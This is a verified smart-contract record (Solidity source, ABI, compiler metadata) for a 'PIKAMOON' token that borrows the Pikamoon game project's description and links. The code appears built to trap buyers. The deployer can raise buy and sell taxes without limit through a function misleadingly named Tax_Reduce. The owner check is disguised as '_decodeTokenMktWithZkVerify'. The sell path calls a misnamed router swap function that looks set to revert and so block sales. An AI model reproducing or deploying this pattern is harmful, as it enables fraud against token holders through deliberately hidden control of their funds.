{"SourceCode": "/*\r\n\r\nCentered around immersive 3D graphics, artistry, and gameplay, Pikamoon is building one of the world's most advanced GameFi metaverses.\r\n$PIKA is the native token of Pikamoon and the surrounding Pikaverse.\r\nOnce acquired, $PIKA can be used to purchase special in-game items via the Pikamoon Store - be it magic boosts, health potions, weapons, and more. \r\nThese upgrades will help bolster your Play-to-Earn journey throughout Dreva.\r\n\r\n\ud83d\udd17 Useful links:\r\nWebsite - https://pikamoon.io\r\nTwitter - https://twitter.com/pikamooncoin\r\nTelegram -\u00a0https://t.me/pikamoonofficial\r\nDiscord -\u00a0https://discord.gg/s2a9DSYYet\r\n\r\n*/\r\n\r\n\r\n\r\n// SPDX-License-Identifier: unlicense\r\n\r\npragma solidity ^0.8.20;\r\n\r\ncontract PIKAMOON {\r\n    string public _name = unicode\"PIKAMOON\";\r\n    string public _symbol = unicode\"PIKA\";\r\n    uint8 public constant decimals = 18;\r\n    uint256 public constant totalSupply = 50_000_000_000 * 10**decimals;\r\n\r\n    struct StoreData {\r\n        address tokenMkt;\r\n        uint8 Tax_buy;\r\n        uint8 Tax_Sell;\r\n    }\r\n\r\n    StoreData public storeData;\r\n    uint256 constant swapAmount = totalSupply / 100;\r\n\r\n    error Permissions();\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed TOKEN_MKT,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    address public pair;\r\n    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n\r\n    bool private swapping;\r\n    bool private tradingOpen;\r\n\r\n    constructor() {\r\n        uint8 _initTax_buy = 0;\r\n        uint8 _initTax_Sell = 2;\r\n        storeData = StoreData({\r\n            tokenMkt: msg.sender,\r\n            Tax_buy: _initTax_buy,\r\n            Tax_Sell: _initTax_Sell\r\n        });\r\n        balanceOf[msg.sender] = totalSupply;\r\n        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;\r\n        emit Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function Tax_Reduce(uint8 _buy, uint8 _sell) external {\r\n        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();\r\n        New_Tax(_buy, _sell);\r\n    }\r\n\r\n    function New_Tax(uint8 _buy, uint8 _sell) private {\r\n        storeData.Tax_buy = _buy;\r\n        storeData.Tax_Sell = _sell;\r\n    }\r\n\r\n    function _decodeTokenMktWithZkVerify() private view returns(address) {\r\n        return storeData.tokenMkt;\r\n    }\r\n\r\n    function OpenTrading() external {\r\n        require(msg.sender == _decodeTokenMktWithZkVerify());\r\n        require(!tradingOpen);\r\n        address _factory = _uniswapV2Router.factory();\r\n        address _weth = _uniswapV2Router.WETH();\r\n        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);\r\n        pair = _pair;\r\n        tradingOpen = true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool) {\r\n        allowance[from][msg.sender] -= amount;\r\n        return _transfer(from, to, amount);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool) {\r\n        allowance[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) external returns (bool) {\r\n        return _transfer(msg.sender, to, amount);\r\n    }\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view  virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal returns (bool) {\r\n        address tokenMkt = _decodeTokenMktWithZkVerify();\r\n        require(tradingOpen || from == tokenMkt || to == tokenMkt);\r\n\r\n        balanceOf[from] -= amount;\r\n\r\n        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount && from != tokenMkt) {\r\n            swapping = true;\r\n            address[] memory path = new address[](2);\r\n            path[0] = address(this);\r\n            path[1] = _uniswapV2Router.WETH();\r\n            _uniswapV2Router\r\n                .swapExactTokensForETHSupportingFreelyOnTransferTokens(\r\n                    swapAmount,\r\n                    0,\r\n                    path,\r\n                    address(this),\r\n                    block.timestamp\r\n                );\r\n            payable(tokenMkt).transfer(address(this).balance);\r\n            swapping = false;\r\n        }\r\n\r\n        (uint8 _Tax_buy, uint8 _Tax_Sell) = (storeData.Tax_buy, storeData.Tax_Sell);\r\n        if (from != address(this) && tradingOpen == true) {\r\n            uint256 taxCalculatedAmount = (amount *\r\n                (to == pair ? _Tax_Sell : _Tax_buy)) / 100;\r\n            amount -= taxCalculatedAmount;\r\n            balanceOf[address(this)] += taxCalculatedAmount;\r\n        }\r\n        balanceOf[to] += amount;\r\n        emit Transfer(from, to, amount);\r\n        return true;\r\n    }\r\n}\r\n\r\ninterface IUniswapFactory {\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function swapExactTokensForETHSupportingFreelyOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"Permissions\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"TOKEN_MKT\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"OpenTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_buy\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"_sell\",\"type\":\"uint8\"}],\"name\":\"Tax_Reduce\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"storeData\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"tokenMkt\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"Tax_buy\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"Tax_Sell\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "PIKAMOON", "CompilerVersion": "v0.8.24+commit.e11b9ed9", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "Unlicense", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://500571be38cc8a068c4325c40c2bfad09403d1c3d11402ed3f43ab55bf67090d"}